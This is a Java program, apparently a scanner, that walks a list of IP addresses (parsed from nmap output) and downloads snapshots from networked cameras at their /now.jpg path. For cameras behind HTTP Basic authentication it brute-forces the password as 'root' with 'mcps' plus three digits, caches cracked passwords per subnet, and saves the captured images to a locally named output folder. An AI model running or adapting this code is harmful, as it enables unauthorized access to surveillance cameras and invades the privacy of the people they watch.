import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Scanner;
import java.util.regex.*;

import javax.imageio.ImageIO;

import org.apache.commons.codec.binary.Base64;

public class HTTPRequester {
	private static String IPADDRESS_PATTERN = "(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)";

	private static ArrayList<Address> ipAddresses;

	private static HashMap<String, String> passMap = new HashMap<String, String>();

	private static final boolean GUESS_PASSWORDS = true;

	private final static String USER_AGENT = "Mozilla/5.0";

	static PrintWriter printOut, debugOut;

	public static void main(String[] args) throws Exception {
		ipAddresses = new ArrayList<Address>();
		printOut = new PrintWriter(new FileOutputStream("cameraScanner.log"));
		debugOut = new PrintWriter(new FileOutputStream("debug.log"));
		
		loadIPList(new File("ipAddresses.sav"));
		loadKnownPasswords(new File("passwords.sav"));
		getPictures();
		saveKnownPasswords(new File("passwords.sav"));
		
		printOut.close();
		debugOut.close();
	}
	
	private static void getPictures() throws IOException {
		for (final Address addr : ipAddresses) {
			getPicture(addr.getIPAddress());
		}
	}
	
	@SuppressWarnings("unused")
	private static void loadCameraProperties() {
		for (final Address addr : ipAddresses) {
			(new Thread() {
				public void run() {
					try {
						addr.setHostType(determineHostType(addr.getIPAddress()));
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}).start();

		}
	}

	private static String determineHostType(String ipAddress) throws Exception {
		int cameraResponse = checkIfCamera(ipAddress);
		switch(cameraResponse) {
		case 200:
			return "No Authentication";
		case 401:
			return "Requires HTTP Authentication";
		case 403:
			return "Requires Login Authentication";
		}
		
		return "Could not connect";
	}

	private static int checkIfCamera(String ipAddress) throws Exception {
		String url = "http://" + ipAddress + "/now.jpg";

		URL requestURL = new URL(url);
		HttpURLConnection connection = (HttpURLConnection) requestURL
				.openConnection();
		connection.setRequestMethod("GET");
		connection.setRequestProperty("User-Agent", USER_AGENT);
		int responseCode = 404;
		try {
			responseCode = connection.getResponseCode();
			printOut.println(ipAddress + " + " + responseCode);
		} catch (Exception e) {
			log("[-] Could not connect to " + ipAddress);
		}
		return responseCode;
	}

	@SuppressWarnings("unused")
	private static void getPicture(String ipAddress) throws IOException {
		String url = "http://" + ipAddress + "/now.jpg";
		System.out.println(url);
		URL requestURL = new URL(url);
		HttpURLConnection connection = (HttpURLConnection) requestURL
				.openConnection();
		connection.setRequestMethod("GET");
		connection.setRequestProperty("User-Agent", USER_AGENT);
		int responseCode = 404;
		try {
			responseCode = connection.getResponseCode();
		} catch(Exception e) {
			return;
		}
		
		if (responseCode == 404) {
			return;
		}

		BufferedImage image;
		File outputFile = new File("outputImages_LocatingPoolesville\\now_"
				+ ipAddress + ".jpg");
		switch (responseCode) {
		case 200:
			image = ImageIO.read(requestURL);
			try {
				ImageIO.write(image, "jpg", outputFile);
			} catch (IOException e) {
				log("Write error for " + outputFile.getPath()
						+ ": " + e.getMessage());
			}
			break;
		case 401:
			String[] ipParts = ipAddress.split("\\.");
			String password = passMap.get(ipParts[2]);
			
			if (password.equals("")) {
				log("[-] Previously unable to find password for: " + ipAddress);
				return;
			}

			if (password == null) {
				if (GUESS_PASSWORDS) {
					password = determineSubnetPassword(ipAddress, ipParts[2]);
					if (password == null) {
						log("[-] Unable to determine password for: " + ipAddress);
						return;
					}
					System.out.println("[+] Guessed password for: " + ipAddress + " as " + password);
				} else{
					return;
				}
			}

			byte[] encoding = Base64.encodeBase64(("root:" + password).getBytes());
			String encodingString = new String(encoding);

			HttpURLConnection authConnection = (HttpURLConnection) requestURL
					.openConnection();
			authConnection.setRequestMethod("POST");
			authConnection.setDoOutput(true);
			authConnection.setRequestProperty("Authorization", "Basic "
					+ encodingString);
			InputStream content = (InputStream) authConnection.getInputStream();
			image = ImageIO.read(content);
			try {
				ImageIO.write(image, "jpg", outputFile);
			} catch (IOException e) {
				log("[-] Write error for " + outputFile.getPath()
						+ ": " + e.getMessage());
			}
			break;
		case 403:
			// Need to look at login javascript and determine how password is being sent
			break;
		}
	}

	private static String determineSubnetPassword(String ipAddress, String subnet)
			throws IOException {
		String password;
		URL url = new URL("http://" + ipAddress + "/now.jpg");

		for (int i = 1; i <= 9; i++) {
			for (int j = 1; j <= 9; j++) {
				for (int k = 1; k <= 9; k++) {
					password = "mcps" + i + "" + j + "" + k;
					byte[] encoding = Base64
							.encodeBase64(("root:" + password).getBytes());
					String encodingString = new String(encoding);

					HttpURLConnection connection = (HttpURLConnection) url
							.openConnection();
					connection.setRequestMethod("POST");
					connection.setDoOutput(true);
					connection.setRequestProperty("Authorization", "Basic "
							+ encodingString);
					if (connection.getResponseCode() == 200) {
						passMap.put(subnet, password);
						return password;
					}
				}
			}
		}
		passMap.put(subnet, "");
		return null;
	}

	private static void loadKnownPasswords(File file) throws FileNotFoundException {
		Scanner fileScanner = new Scanner(file);

		while (fileScanner.hasNext()) {
			String line = fileScanner.nextLine();
			String[] parsedLine = line.split("\t|\t");
			passMap.put(parsedLine[0], parsedLine[1]);
		}

		fileScanner.close();
	}

	private static void saveKnownPasswords(File file) throws FileNotFoundException {
		PrintWriter pw = new PrintWriter(new FileOutputStream("passwords.sav"));
		Iterator<Entry<String, String>> it = passMap.entrySet().iterator();
		while (it.hasNext()) {
			Map.Entry<String, String> pairs = (Map.Entry<String, String>) it
					.next();
			pw.println(pairs.getKey() + "\t|\t" + pairs.getValue());
			it.remove();
		}
		pw.close();
	}

	private static void loadIPList(File file) throws FileNotFoundException {
		Scanner fileScanner = new Scanner(file);

		while (fileScanner.hasNext()) {
			String line = fileScanner.nextLine();
			ipAddresses.add(new Address(line));
		}
		fileScanner.close();
	}

	private static void saveIPList() throws FileNotFoundException {
		PrintWriter pw = new PrintWriter(
				new FileOutputStream("ipAddresses.sav"));
		for (Address ipAddress : ipAddresses) {
			pw.println(ipAddress.getIPAddress());
		}
		pw.close();
	}

	@SuppressWarnings("unused")
	private static void parseNmapLog(File file) throws FileNotFoundException {
		Scanner fileScanner = new Scanner(file);
		Pattern pattern = Pattern.compile(IPADDRESS_PATTERN);
		Matcher matcher;

		while (fileScanner.hasNext()) {
			String line = fileScanner.nextLine();
			if (!line.contains("d")) {
				matcher = pattern.matcher(line);

				if (matcher.find()) {
					ipAddresses.add(new Address(matcher.group()));
				}
			}
		}
		fileScanner.close();
	}

	@SuppressWarnings("unused")
	private static ArrayList<Address> sortIpAddresses(
			ArrayList<Address> ipAddressList) {
		ArrayList<Address> sorted = new ArrayList<Address>();
		for (int i = 0; i < ipAddressList.size(); i++) {
			Address biggest = ipAddressList.get(i);
			for (int j = i; j < ipAddressList.size(); j++) {
				if (ipAddressList.get(j).getIPAddress()
						.compareTo(biggest.getIPAddress()) < 0) {
					biggest = ipAddressList.get(j);
				}
			}
			sorted.add(biggest);
		}
		return sorted;
	}

	@SuppressWarnings("unused")
	private void print(String str) {
		System.out.println(str);
		printOut.println(str);
	}

	private static void log(String message) {
		debugOut.println(message);
	}
}